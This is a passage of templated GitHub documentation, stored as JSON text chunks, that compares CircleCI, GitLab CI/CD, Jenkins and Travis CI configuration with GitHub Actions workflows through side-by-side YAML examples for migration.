more information about the tools and packages available on {% data variables.product.prodname_dotcom %}-hosted runner images, see \"AUTOTITLE\".\n{% endif %}\n\n\n\nUsing variables and secrets\n\nC", "Y2h1bmtfMl9pbmRleF8xNjU=": "ircleCI and {% data variables.product.prodname_actions %} support setting variables in the configuration file and creating secrets using the CircleCI or {% data variables.product.product_name %} UI.\n\nFor more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n\n\nCaching\n\nCircleCI and {% data variables.product.prodname_actions %} provide a method to manually cache files in the configuration file.\n\n{% ifversion actions-caching %}\n\nBelow is an example of the syntax for each system.\n\n\n\nCircleCI syntax for caching\n\n{% raw %}\n\n```yaml\n- restore_cache:\n    keys:\n      - v1-npm-deps-{{ checksum \"package-lock.json\" }}\n      - v1-npm-deps-\n```\n\n{% endraw %}\n\n\n\nGitHub Actions syntax for caching\n\n```yaml\n- name: Cache node modules\n  uses: {% data reusables.actions.action-cache %}\n  with:\n    path: ~/.npm\n    key: {% raw %}v1-npm-deps-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n    restore-keys: v1-npm-deps-\n```\n\n{% else %}\n\n{% data reusables.actions.caching-availability %}\n\n{% endif %}\n\n{% data variables.product.prodname_actions %} does not have an equivalent of CircleCI\u2019s Docker Layer Caching (or DLC).\n\n\n\nPersisting data between jobs\n\nBoth CircleCI and {% data variables.product.prodname_actions %} provide mechanisms to persist data between jobs.\n\nBelow is an example in CircleCI and {% data variables.product.prodname_actions %} configuration syntax.\n\n\n\nCircleCI syntax for persisting data between jobs\n\n{% raw %}\n\n```yaml\n- persist_to_workspace:\n    root: workspace\n    paths:\n      - math-homework.txt\n\n...\n\n- attach_workspace:\n    at: /tmp/workspace\n```\n\n{% endraw %}\n\n\n\nGitHub Actions syntax for persisting data between jobs\n\n```yaml\n- name: Upload math result for job 1\n  uses: {% data reusables.actions.action-upload-artifact %}\n  with:\n    name: homework\n    path: math-homework.txt\n\n...\n\n- name: Download math result for job 1\n  uses: {% data reusables.actions.action-download-artifact %}\n  with:\n    name: homework\n```\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nUsing databases and service containers\n\nBoth systems enable you ", "Y2h1bmtfM19pbmRleF8xNjU=": "to include additional containers for databases, caching, or other dependencies.\n\nIn CircleCI, the first image listed in the _config.yaml_ is the primary image used to run commands. {% data variables.product.prodname_actions %} uses explicit sections: use `container` for the primary container, and list additional containers in `services`.\n\nBelow is an example in CircleCI and {% data variables.product.prodname_actions %} configuration syntax.\n\n\n\nCircleCI syntax for using databases and service containers\n\n{% raw %}\n\n```yaml\n---\nversion: 2.1\n\njobs:\n\n  ruby-26:\n    docker:\n      - image: circleci/ruby:2.6.3-node-browsers-legacy\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby26\n          POSTGRES_PASSWORD: \"\"\n\n    working_directory: ~/administrate\n\n    steps:\n      - checkout\n\n      # Bundle install dependencies\n      - run: bundle install --path vendor/bundle\n\n      # Wait for DB\n      - run: dockerize -wait tcp://localhost:5432 -timeout 1m\n\n      # Setup the environment\n      - run: cp .sample.env .env\n\n      # Setup the database\n      - run: bundle exec rake db:setup\n\n      # Run the tests\n      - run: bundle exec rake\n\n\nworkflows:\n  version: 2\n  build:\n    jobs:\n      - ruby-26\n...\n\n- attach_workspace:\n    at: /tmp/workspace\n```\n\n{% endraw %}\n\n\n\nGitHub Actions syntax for using databases and service containers\n\n\n\n```yaml\nname: Containers\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    container: circleci/ruby:2.6.3-node-browsers-legacy\n\n    env:\n      PGHOST: postgres\n      PGUSER: administrate\n      RAILS_ENV: test\n\n    services:\n      postgres:\n        image: postgres:10.1-alpine\n        env:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n        ports:\n          - 5432:5432\n        # Add a health check\n        options: --health-cmd pg_isready --health-interval 10s --healt", "Y2h1bmtfNF9pbmRleF8xNjU=": "h-timeout 5s --health-retries 5\n\n    steps:\n      # This Docker file changes sets USER to circleci instead of using the default user, so we need to update file permissions for this image to work on GH Actions.\n      # See https://docs.github.com/actions/using-github-hosted-runners/about-github-hosted-runners#docker-container-filesystem\n\n      - name: Setup file system permissions\n        run: sudo chmod -R 777 $GITHUB_WORKSPACE /github /__w/_temp\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Install dependencies\n        run: bundle install --path vendor/bundle\n      - name: Setup environment configuration\n        run: cp .sample.env .env\n      - name: Setup database\n        run: bundle exec rake db:setup\n      - name: Run tests\n        run: bundle exec rake\n```\n\n\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nComplete Example\n\nBelow is a real-world example. The left shows the actual CircleCI _config.yml_ for the thoughtbot/administrator repository. The right shows the {% data variables.product.prodname_actions %} equivalent.\n\n\n\nComplete example for CircleCI\n\n{% raw %}\n\n```yaml\n---\nversion: 2.1\n\ncommands:\n  shared_steps:\n    steps:\n      - checkout\n\n      # Restore Cached Dependencies\n      - restore_cache:\n          name: Restore bundle cache\n          key: administrate-{{ checksum \"Gemfile.lock\" }}\n\n      # Bundle install dependencies\n      - run: bundle install --path vendor/bundle\n\n      # Cache Dependencies\n      - save_cache:\n          name: Store bundle cache\n          key: administrate-{{ checksum \"Gemfile.lock\" }}\n          paths:\n            - vendor/bundle\n\n      # Wait for DB\n      - run: dockerize -wait tcp://localhost:5432 -timeout 1m\n\n      # Setup the environment\n      - run: cp .sample.env .env\n\n      # Setup the database\n      - run: bundle exec rake db:setup\n\n      # Run the tests\n      - run: bundle exec rake\n\ndefault_job: &default_job\n  working_directory: ~/administrate\n  steps:\n    - shared_steps\n    # Run the tests against multiple versions of Rails\n    - run: bundle e", "Y2h1bmtfNV9pbmRleF8xNjU=": "xec appraisal install\n    - run: bundle exec appraisal rake\n\njobs:\n  ruby-25:\n    <<: *default_job\n    docker:\n      - image: circleci/ruby:2.5.0-node-browsers\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n\n  ruby-26:\n    <<: *default_job\n    docker:\n      - image: circleci/ruby:2.6.3-node-browsers-legacy\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby26\n          POSTGRES_PASSWORD: \"\"\n\n\nworkflows:\n  version: 2\n  multiple-rubies:\n    jobs:\n      - ruby-26\n      - ruby-25\n```\n\n{% endraw %}\n\n\n\nComplete example for GitHub Actions\n\n```yaml\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Containers\n\non: [push]\n\njobs:\n  build:\n\n    strategy:\n      matrix:\n        ruby: ['2.5', '2.6.3']\n\n    runs-on: ubuntu-latest\n\n    env:\n      PGHOST: localhost\n      PGUSER: administrate\n      RAILS_ENV: test\n\n    services:\n      postgres:\n        image: postgres:10.1-alpine\n        env:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n        ports:\n          - 5432:5432\n        # Add a health check\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Ruby\n        uses: eregon/use-ruby-action@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: {% raw %}${{ matrix.ruby }}{% endraw %}\n      - name: Cache dependencies\n        uses: {% data reusables.actions.action-cache %}\n        with:\n          path: vendor/bundle\n          key: administrate", "Y2h1bmtfNl9pbmRleF8xNjU=": "-{% raw %}${{ matrix.image }}-${{ hashFiles('Gemfile.lock') }}{% endraw %}\n      - name: Install postgres headers\n        run: |\n          sudo apt-get update\n          sudo apt-get install libpq-dev\n      - name: Install dependencies\n        run: bundle install --path vendor/bundle\n      - name: Setup environment configuration\n        run: cp .sample.env .env\n      - name: Setup database\n        run: bundle exec rake db:setup\n      - name: Run tests\n        run: bundle exec rake\n      - name: Install appraisal\n        run: bundle exec appraisal install\n      - name: Run appraisal\n        run: bundle exec appraisal rake\n```\n\n", "Y2h1bmtfMF9pbmRleF8xNjY=": "\n\nIntroduction\n\nGitLab CI/CD and {% data variables.product.prodname_actions %} both allow you to create workflows that automatically build, test, publish, release, and deploy code. GitLab CI/CD and {% data variables.product.prodname_actions %} share some similarities in workflow configuration:\n\n- Workflow configuration files are written in YAML and are stored in the code's repository.\n- Workflows include one or more jobs.\n- Jobs include one or more steps or individual commands.\n- Jobs can run on either managed or self-hosted machines.\n\nThere are a few differences, and this guide will show you the important differences so that you can migrate your workflow to {% data variables.product.prodname_actions %}.\n\n\n\nJobs\n\nJobs in GitLab CI/CD are very similar to jobs in {% data variables.product.prodname_actions %}. In both systems, jobs have the following characteristics:\n\n- Jobs contain a series of steps or scripts that run sequentially.\n- Jobs can run on separate machines or in separate containers.\n- Jobs run in parallel by default, but can be configured to run sequentially.\n\nYou can run a script or a shell command in a job. In GitLab CI/CD, script steps are specified using the `script` key. In {% data variables.product.prodname_actions %}, all scripts are specified using the `run` key.\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for jobs\n\n{% raw %}\n\n```yaml\njob1:\n  variables:\n    GIT_CHECKOUT: \"true\"\n  script:\n    - echo \"Run your script here\"\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for jobs\n\n```yaml\njobs:\n  job1:\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - run: echo \"Run your script here\"\n```\n\n\n\nRunners\n\nRunners are machines on which the jobs run. Both GitLab CI/CD and {% data variables.product.prodname_actions %} offer managed and self-hosted variants of runners. In GitLab CI/CD, `tags` are used to run jobs on different platforms, while in {% data variables.product.prodname_actions %} it is done with the `runs-on` key.", "Y2h1bmtfMV9pbmRleF8xNjY=": "\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for runners\n\n{% raw %}\n\n```yaml\nwindows_job:\n  tags:\n    - windows\n  script:\n    - echo Hello, %USERNAME%!\n\nlinux_job:\n  tags:\n    - linux\n  script:\n    - echo \"Hello, $USER!\"\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for runners\n\n{% raw %}\n\n```yaml\nwindows_job:\n  runs-on: windows-latest\n  steps:\n    - run: echo Hello, %USERNAME%!\n\nlinux_job:\n  runs-on: ubuntu-latest\n  steps:\n    - run: echo \"Hello, $USER!\"\n```\n\n{% endraw %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nDocker images\n\nBoth GitLab CI/CD and {% data variables.product.prodname_actions %} support running jobs in a Docker image. In GitLab CI/CD, Docker images are defined with an `image` key, while in {% data variables.product.prodname_actions %} it is done with the `container` key.\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for Docker images\n\n{% raw %}\n\n```yaml\nmy_job:\n  image: node:10.16-jessie\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for Docker images\n\n{% raw %}\n\n```yaml\njobs:\n  my_job:\n    container: node:10.16-jessie\n```\n\n{% endraw %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nCondition and expression syntax\n\nGitLab CI/CD uses `rules` to determine if a job will run for a specific condition. {% data variables.product.prodname_actions %} uses the `if` keyword to prevent a job from running unless a condition is met.\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for conditions and expressions\n\n{% raw %}\n\n```yaml\ndeploy_prod:\n  stage: deploy\n  script:\n    - echo \"Deploy to production server\"\n  rules:\n    - if: '$CI_COMMIT_BRANCH == \"master\"'\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for conditions and expressions\n\n{% raw %}\n\n```yaml\njobs:\n  deploy_prod:\n    if: contains( github.ref, 'master')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploy to production server\"\n```\n\n{% endraw %}\n\nFor more information, see \"AUT", "Y2h1bmtfMl9pbmRleF8xNjY=": "OTITLE.\"\n\n\n\nDependencies between Jobs\n\nBoth GitLab CI/CD and {% data variables.product.prodname_actions %} allow you to set dependencies for a job. In both systems, jobs run in parallel by default, but job dependencies in {% data variables.product.prodname_actions %} can be specified explicitly with the `needs` key. GitLab CI/CD also has a concept of `stages`, where jobs in a stage run concurrently, but the next stage will start when all the jobs in the previous stage have completed. You can recreate this scenario in {% data variables.product.prodname_actions %} with the `needs` key.\n\nBelow is an example of the syntax for each system. The workflows start with two jobs named `build_a` and `build_b` running in parallel, and when those jobs complete, another job called `test_ab` will run. Finally, when `test_ab` completes, the `deploy_ab` job will run.\n\n\n\nGitLab CI/CD syntax for dependencies between jobs\n\n{% raw %}\n\n```yaml\nstages:\n  - build\n  - test\n  - deploy\n\nbuild_a:\n  stage: build\n  script:\n    - echo \"This job will run first.\"\n\nbuild_b:\n  stage: build\n  script:\n    - echo \"This job will run first, in parallel with build_a.\"\n\ntest_ab:\n  stage: test\n  script:\n    - echo \"This job will run after build_a and build_b have finished.\"\n\ndeploy_ab:\n  stage: deploy\n  script:\n    - echo \"This job will run after test_ab is complete\"\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for dependencies between jobs\n\n{% raw %}\n\n```yaml\njobs:\n  build_a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first.\"\n\n  build_b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first, in parallel with build_a\"\n\n  test_ab:\n    runs-on: ubuntu-latest\n    needs: [build_a,build_b]\n    steps:\n      - run: echo \"This job will run after build_a and build_b have finished\"\n\n  deploy_ab:\n    runs-on: ubuntu-latest\n    needs: [test_ab]\n    steps:\n      - run: echo \"This job will run after test_ab is complete\"\n```\n\n{% endraw %}\n\nFor more information, see \"AUTOTITLE.\"\n", "Y2h1bmtfM19pbmRleF8xNjY=": "\n\n\nScheduling workflows\n\nBoth GitLab CI/CD and {% data variables.product.prodname_actions %} allow you to run workflows at a specific interval. In GitLab CI/CD, pipeline schedules are configured with the UI, while in {% data variables.product.prodname_actions %} you can trigger a workflow on a scheduled interval with the \"on\" key.\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nVariables and secrets\n\nGitLab CI/CD and {% data variables.product.prodname_actions %} support setting variables in the pipeline or workflow configuration file, and creating secrets using the GitLab or {% data variables.product.product_name %} UI.\n\nFor more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n\n\nCaching\n\nGitLab CI/CD and {% data variables.product.prodname_actions %} provide a method in the configuration file to manually cache workflow files.\n\n{% ifversion actions-caching %}\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for caching\n\n{% raw %}\n\n```yaml\nimage: node:latest\n\ncache:\n  key: $CI_COMMIT_REF_SLUG\n  paths:\n    - .npm/\n\nbefore_script:\n  - npm ci --cache .npm --prefer-offline\n\ntest_async:\n  script:\n    - node ./specs/start.js ./specs/async.spec.js\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for caching\n\n```yaml\njobs:\n  test_async:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Cache node modules\n      uses: {% data reusables.actions.action-cache %}\n      with:\n        path: ~/.npm\n        key: {% raw %}v1-npm-deps-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n        restore-keys: v1-npm-deps-\n```\n\n{% else %}\n\n{% data reusables.actions.caching-availability %}\n\n{% endif %}\n\n\n\nArtifacts\n\nBoth GitLab CI/CD and {% data variables.product.prodname_actions %} can upload files and directories created by a job as artifacts. In {% data variables.product.prodname_actions %}, artifacts can be used to persist data across multiple jobs.\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for artifacts\n\n{% raw %}\n\n```yaml\nscript:\nartifacts:\n  paths:\n    - ", "Y2h1bmtfNF9pbmRleF8xNjY=": "math-homework.txt\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for artifacts\n\n```yaml\n- name: Upload math result for job 1\n  uses: {% data reusables.actions.action-upload-artifact %}\n  with:\n    name: homework\n    path: math-homework.txt\n```\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nDatabases and service containers\n\nBoth systems enable you to include additional containers for databases, caching, or other dependencies.\n\nIn GitLab CI/CD, a container for the job is specified with the `image` key, while {% data variables.product.prodname_actions %} uses the `container` key. In both systems, additional service containers are specified with the `services` key.\n\nBelow is an example of the syntax for each system.\n\n\n\nGitLab CI/CD syntax for databases and service containers\n\n{% raw %}\n\n```yaml\ncontainer-job:\n  variables:\n    POSTGRES_PASSWORD: postgres\n    # The hostname used to communicate with the\n    # PostgreSQL service container\n    POSTGRES_HOST: postgres\n    # The default PostgreSQL port\n    POSTGRES_PORT: 5432\n  image: node:10.18-jessie\n  services:\n    - postgres\n  script:\n    # Performs a clean installation of all dependencies\n    # in the `package.json` file\n    - npm ci\n    # Runs a script that creates a PostgreSQL client,\n    # populates the client with data, and retrieves data\n    - node client.js\n  tags:\n    - docker\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %}  syntax for databases and service containers\n\n```yaml\njobs:\n  container-job:\n    runs-on: ubuntu-latest\n    container: node:10.18-jessie\n\n    services:\n      postgres:\n        image: postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies\n      # in the `package.json` file\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL client,\n        # ", "Y2h1bmtfNV9pbmRleF8xNjY=": "populates the client with data, and retrieves data\n        run: node client.js\n        env:\n          # The hostname used to communicate with the\n          # PostgreSQL service container\n          POSTGRES_HOST: postgres\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432\n```\n\nFor more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNjc=": "\n\nIntroduction\n\nJenkins and {% data variables.product.prodname_actions %} both allow you to create workflows that automatically build, test, publish, release, and deploy code. Jenkins and {% data variables.product.prodname_actions %} share some similarities in workflow configuration:\n\n- Jenkins creates workflows using _Declarative Pipelines_, which are similar to {% data variables.product.prodname_actions %} workflow files.\n- Jenkins uses _stages_ to run a collection of steps, while {% data variables.product.prodname_actions %} uses jobs to group one or more steps or individual commands.\n- Jenkins and {% data variables.product.prodname_actions %} support container-based builds. For more information, see \"AUTOTITLE.\"\n- Steps or tasks can be reused and shared with the community.\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nKey differences\n\n- Jenkins has two types of syntax for creating pipelines: Declarative Pipeline and Scripted Pipeline. {% data variables.product.prodname_actions %} uses YAML to create workflows and configuration files. For more information, see \"AUTOTITLE.\"\n- Jenkins deployments are typically self-hosted, with users maintaining the servers in their own data centers. {% data variables.product.prodname_actions %} offers a hybrid cloud approach by hosting its own runners that you can use to run jobs, while also supporting self-hosted runners. For more information, see AUTOTITLE.\n\n\n\nComparing capabilities\n\n\n\nDistributing your builds\n\nJenkins lets you send builds to a single build agent, or you can distribute them across multiple agents. You can also classify these agents according to various attributes, such as operating system types.\n\nSimilarly, {% data variables.product.prodname_actions %} can send jobs to {% data variables.product.prodname_dotcom %}-hosted or self-hosted runners, and you can use labels to classify runners according to various attributes. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n\n\nUsing sections to organize pipelines\n\nJenkins splits its Declarative Pipelines into mult", "Y2h1bmtfMV9pbmRleF8xNjc=": "iple sections. Similarly, {% data variables.product.prodname_actions %} organizes its workflows into separate sections. The table below compares Jenkins sections with the {% data variables.product.prodname_actions %} workflow.\n\n| Jenkins Directives | {% data variables.product.prodname_actions %} |\n| ------------- | ------------- |\n| `agent`   | `jobs..runs-on`  `jobs..container` |\n| `post`     | None  |\n| `stages` | `jobs` |\n| `steps`   | `jobs..steps` |\n\n\n\nUsing directives\n\nJenkins uses directives to manage _Declarative Pipelines_. These directives define the characteristics of your workflow and how it will execute. The table below demonstrates how these directives map to concepts within {% data variables.product.prodname_actions %}.\n\n| Jenkins Directives | {% data variables.product.prodname_actions %} |\n| ------------- | ------------- |\n| `environment`                  | `jobs..env`  `jobs..steps[*].env` |\n| `options`                       | `jobs..strategy`  `jobs..strategy.fail-fast`  `jobs..timeout-minutes` |\n| `parameters`                    | `inputs`  `outputs` |\n| `triggers`                        | `on`  `on..types`  on..  on..  on..paths |\n| `triggers { upstreamprojects() }` | `jobs..needs` |\n| Jenkins cron syntax            | `on.schedule` |\n| `stage`                              | `jobs.`  `jobs..name` |\n| `tools`                              | {% ifversion ghae %}The command-line tools available in `PATH` on your self-hosted runner systems. {% data reusables.actions.self-hosted-runners-software %}{% else %}Specifications for {% data variables.product.prodname_dotcom %}-hosted runners |{% endif %}\n| `input`                              | `inputs` |\n| `when`                                | `jobs..if` |\n\n\n\nUsing sequential stages\n\n\n\nParallel job processing\n\nJenkins can run the `stages` and `steps` in parallel, while {% data variables.product.prodname_actions %} currently only runs jobs in parallel.\n\n| Jenkins Parallel | {% data variables.product.prodname_actions %} |\n| ------------- | ------------- |\n", "Y2h1bmtfMl9pbmRleF8xNjc=": "| `parallel` | `jobs..strategy.max-parallel` |\n\n\n\nMatrix\n\nBoth {% data variables.product.prodname_actions %} and Jenkins let you use a matrix to define various system combinations.\n\n| Jenkins       | {% data variables.product.prodname_actions %} |\n| ------------- | ------------- |\n| `axis`       | `strategy/matrix`  `context` |\n| `stages`   | `steps-context` |\n| `excludes` | None |\n\n\n\nUsing steps to execute tasks\n\nJenkins groups `steps` together in `stages`. Each of these steps can be a script, function, or command, among others. Similarly, {% data variables.product.prodname_actions %} uses `jobs` to execute specific groups of `steps`.\n\n| Jenkins       | {% data variables.product.prodname_actions %} |\n| ------------- | ------------- |\n| `steps` | `jobs..steps` |\n\n\n\nExamples of common tasks\n\n\n\nScheduling a pipeline to run with `cron`\n\n\n\nJenkins pipeline with `cron`\n\n```yaml\npipeline {\n  agent any\n  triggers {\n    cron('H/15 * * * 1-5')\n  }\n}\n```\n\n\n\n{% data variables.product.prodname_actions %} workflow with `cron`\n\n```yaml\non:\n  schedule:\n    - cron: '*/15 * * * 1-5'\n```\n\n\n\nConfiguring environment variables in a pipeline\n\n\n\nJenkins pipeline with an environment variable\n\n```yaml\npipeline {\n  agent any\n  environment {\n    MAVEN_PATH = '/usr/local/maven'\n  }\n}\n```\n\n\n\n{% data variables.product.prodname_actions %} workflow with an environment variable\n\n```yaml\njobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'\n```\n\n\n\nBuilding from upstream projects\n\n\n\nJenkins pipeline that builds from an upstream project\n\n```yaml\npipeline {\n  triggers {\n    upstream(\n      upstreamProjects: 'job1,job2',\n      threshold: hudson.model.Result.SUCCESS\n    )\n  }\n}\n```\n\n\n\n{% data variables.product.prodname_actions %} workflow that builds from an upstream project\n\n```yaml\njobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]\n```\n\n\n\nBuilding with multiple operating systems\n\n\n\nJenkins pipeline that builds with multiple operating systems\n\n```yaml\npipeline {\n  agent none\n  stages {\n    stage('Run Tests') {\n      ma", "Y2h1bmtfM19pbmRleF8xNjc=": "trix {\n        axes {\n          axis {\n            name: 'PLATFORM'\n            values: 'macos', 'linux'\n          }\n        }\n        agent { label \"${PLATFORM}\" }\n        stages {\n          stage('test') {\n            tools { nodejs \"node-16\" }\n            steps {\n              dir(\"scripts/myapp\") {\n                sh(script: \"npm install -g bats\")\n                sh(script: \"bats tests\")\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n\n\n{% data variables.product.prodname_actions %} workflow that builds with multiple operating systems\n\n```yaml\nname: demo-workflow\non:\n  push:\njobs:\n  test:\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [macos-latest, ubuntu-latest]\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: 16\n      - run: npm install -g bats\n      - run: bats tests\n        working-directory: ./scripts/myapp\n```\n\n", "Y2h1bmtfMF9pbmRleF8xNjg=": "\n\nIntroduction\n\nThis guide helps you migrate from Travis CI to {% data variables.product.prodname_actions %}. It compares their concepts and syntax, describes the similarities, and demonstrates their different approaches to common tasks.\n\n\n\nBefore you start\n\nBefore starting your migration to {% data variables.product.prodname_actions %}, it would be useful to become familiar with how it works:\n\n- For a quick example that demonstrates a {% data variables.product.prodname_actions %} job, see \"AUTOTITLE.\"\n- To learn the essential {% data variables.product.prodname_actions %} concepts, see \"AUTOTITLE.\"\n\n\n\nComparing job execution\n\nTo give you control over when CI tasks are executed, a {% data variables.product.prodname_actions %} _workflow_ uses _jobs_ that run in parallel by default. Each job contains _steps_ that are executed in a sequence that you define. If you need to run setup and cleanup actions for a job, you can define steps in each job to perform these.\n\n\n\nKey similarities\n\n{% data variables.product.prodname_actions %} and Travis CI share certain similarities, and understanding these ahead of time can help smooth the migration process.\n\n\n\nUsing YAML syntax\n\nTravis CI and {% data variables.product.prodname_actions %} both use YAML to create jobs and workflows, and these files are stored in the code's repository. For more information on how {% data variables.product.prodname_actions %} uses YAML, see \"AUTOTITLE.\"\n\n\n\nCustom variables\n\nTravis CI lets you set variables and share them between stages. Similarly, {% data variables.product.prodname_actions %} lets you define variables for a workflows. For more information, see \"AUTOTITLE.\"\n\n\n\nDefault variables\n\nTravis CI and {% data variables.product.prodname_actions %} both include default environment variables that you can use in your YAML files. For {% data variables.product.prodname_actions %}, you can see these listed in \"AUTOTITLE.\"\n\n\n\nParallel job processing\n\nTravis CI can use `stages` to run jobs in parallel. Similarly, {% data variables.product.prodname_acti", "Y2h1bmtfMV9pbmRleF8xNjg=": "ons %} runs `jobs` in parallel. For more information, see \"AUTOTITLE.\"\n\n\n\nStatus badges\n\nTravis CI and {% data variables.product.prodname_actions %} both support status badges, which let you indicate whether a build is passing or failing.\nFor more information, see \"AUTOTITLE.\"\n\n\n\nUsing a matrix\n\nTravis CI and {% data variables.product.prodname_actions %} both support a matrix, allowing you to perform testing using combinations of operating systems and software packages. For more information, see \"AUTOTITLE.\"\n\nBelow is an example comparing the syntax for each system.\n\n\n\nTravis CI syntax for a matrix\n\n{% raw %}\n\n```yaml\nmatrix:\n  include:\n    - rvm: '2.5'\n    - rvm: '2.6.3'\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for a matrix\n\n{% raw %}\n\n```yaml\njobs:\n  build:\n    strategy:\n      matrix:\n        ruby: ['2.5', '2.6.3']\n```\n\n{% endraw %}\n\n\n\nTargeting specific branches\n\nTravis CI and {% data variables.product.prodname_actions %} both allow you to target your CI to a specific branch. For more information, see \"AUTOTITLE.\"\n\nBelow is an example of the syntax for each system.\n\n\n\nTravis CI syntax for targeting specific branches\n\n{% raw %}\n\n```yaml\nbranches:\n  only:\n    - main\n    - 'mona/octocat'\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for targeting specific branches\n\n{% raw %}\n\n```yaml\non:\n  push:\n    branches:\n      - main\n      - 'mona/octocat'\n```\n\n{% endraw %}\n\n\n\nChecking out submodules\n\nTravis CI and {% data variables.product.prodname_actions %} both allow you to control whether submodules are included in the repository clone.\n\nBelow is an example of the syntax for each system.\n\n\n\nTravis CI syntax for checking out submodules\n\n{% raw %}\n\n```yaml\ngit:\n  submodules: false\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for checking out submodules\n\n```yaml\n- uses: {% data reusables.actions.action-checkout %}\n  with:\n    submodules: false\n```\n\n\n\nUsing environment variables in a matrix\n\nTravis CI and {% data variables.product.prod", "Y2h1bmtfMl9pbmRleF8xNjg=": "name_actions %} can both add custom variables to a test matrix, which allows you to refer to the variable in a later step.\n\nIn {% data variables.product.prodname_actions %}, you can use the `include` key to add custom environment variables to a matrix. {% data reusables.actions.matrix-variable-example %}\n\n\n\nKey features in {% data variables.product.prodname_actions %}\n\nWhen migrating from Travis CI, consider the following key features in {% data variables.product.prodname_actions %}:\n\n\n\nStoring secrets\n\n{% data variables.product.prodname_actions %} allows you to store secrets and reference them in your jobs. {% data variables.product.prodname_actions %} organizations can limit which repositories can access organization secrets. Deployment protection rules can require manual approval for a workflow to access environment secrets. For more information, see \"AUTOTITLE.\"\n\n\n\nSharing files between jobs and workflows\n\n{% data variables.product.prodname_actions %} includes integrated support for artifact storage, allowing you to share files between jobs in a workflow. You can also save the resulting files and share them with other workflows. For more information, see \"AUTOTITLE.\"\n\n\n\nHosting your own runners\n\nIf your jobs require specific hardware or software, {% data variables.product.prodname_actions %} allows you to host your own runners and send your jobs to them for processing. {% data variables.product.prodname_actions %} also lets you use policies to control how these runners are accessed, granting access at the organization or repository level. For more information, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec %}\n\n\n\nConcurrent jobs and execution time\n\nThe concurrent jobs and workflow execution times in {% data variables.product.prodname_actions %} can vary depending on your {% data variables.product.company_short %} plan. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nUsing different languages in {% data variables.product.prodname_actions %}\n\nWhen working with different languages in {% data variables.product.", "Y2h1bmtfM19pbmRleF8xNjg=": "prodname_actions %}, you can create a step in your job to set up your language dependencies. 